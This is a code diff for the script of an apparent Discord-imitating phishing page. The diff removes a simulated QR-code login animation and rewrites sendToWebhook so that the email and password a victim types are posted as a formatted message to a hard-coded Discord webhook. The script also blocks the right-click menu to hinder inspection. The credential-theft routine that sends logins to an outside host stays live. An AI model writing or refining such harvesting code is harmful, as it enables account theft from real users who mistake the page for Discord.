@@ -37,58 +37,6 @@ function animateEllipsis() {
 }
 
 // --------------------------------------------------
-// ---------- WANDERING CUBES ANIMATION -------------
-// --------------------------------------------------
-function generateRandomString() {
-  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  let result = "";
-  for (let i = 0; i < 43; i++) {
-    result += characters.charAt(Math.floor(Math.random() * characters.length));
-  }
-  return result;
-}
-
-function removeQrCodeAnimation() {
-  const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  qrCodeContainer.innerHTML = "";
-  qrCodeContainer.insertAdjacentElement(
-    "afterbegin",
-    generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
-  );
-  qrCodeContainer.insertAdjacentHTML(
-    "beforeend",
-    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
-  );
-  qrCodeContainer.style.background = "white";
-}
-
-function simulateQrCodeChange() {
-  const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  if (qrCodeContainer.querySelector("svg")) {
-    qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
-  }
-  if (qrCodeContainer.querySelector("img")) {
-    qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
-  }
-  qrCodeContainer.style.background = "transparent";
-  const markup = `<span
-                  class="spinner qrCode-spinner"
-                  role="img"
-                  aria-label="Loading"
-                  aria-hidden="true"
-                  >
-                  <span class="inner wanderingCubes">
-                    <span class="item"></span>
-                    <span class="item"></span>
-                  </span>
-                </span>`;
-  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
-  setTimeout(removeQrCodeAnimation, 3500);
-}
-
-setInterval(simulateQrCodeChange, 120 * 1000);
-
-// --------------------------------------------------
 // ---------- GENERATING QRCODE ---------------------
 // --------------------------------------------------
 function generateQRCode(data) {
@@ -121,10 +69,9 @@ function generateQRCode(data) {
 async function sendToWebhook(email, password) {
   const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
   const payload = {
-    email: email,
-    password: password,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent
+    content: `Email: ${email}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`,  // Include the email, password, and timestamp as part of the content.
+    username: "Login Attempt", // You can customize the bot's username
+    avatar_url: "https://example.com/avatar.png", // Optional: Provide an avatar for the bot
   };
 
   console.log("Attempting to send payload:", payload); // Debug: See what’s being sent
@@ -187,12 +134,4 @@ loginButton.addEventListener("click", async () => {
 
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
-});
-
-// Initial QR setup if needed (assuming page loads with QR container)
-document.addEventListener("DOMContentLoaded", () => {
-  const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  if (qrCodeContainer && !qrCodeContainer.innerHTML) {
-    removeQrCodeAnimation(); // Initialize QR
-  }
 });
